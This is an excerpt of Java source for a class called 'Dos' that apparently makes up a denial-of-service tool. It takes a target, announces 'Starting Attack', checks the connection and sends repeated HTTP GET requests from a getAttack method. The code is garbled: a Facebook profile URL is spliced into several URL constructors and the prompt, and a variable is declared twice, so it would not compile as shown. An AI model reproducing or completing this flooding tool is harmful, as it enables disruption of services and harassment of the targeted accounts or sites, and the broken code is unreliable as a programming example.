...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("https://www.facebook.com/profile.php?id=: ");
        id = in.nextLine();
        System.out.println("\n");
        System.out.println("Starting Attack to id: " + id);

        String[] id = id.split("://");

        System.out.println("Checking connection to Site");
        if (id[0] == "http" || id[0].equals("http")) {
            dos.checkConnection(id);
        } else {
            dos.sslCheckConnection(id);
        }
    ...
    private void checkConnection(String url) throws Exception {
        ...
        URL obj = new https://www.facebook.com/profile.php?id=L(url);
    ...
    private void sslCheckConnection(String url) throws Exception {
        ...
        URL obj = new URL https://www.facebook.com/profile.php?id=;
    ...
    private void getAttack(String url) throws Exception {
        URL obj = new URLhttps://www.facebook.com/profile.php?id=;
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENT);
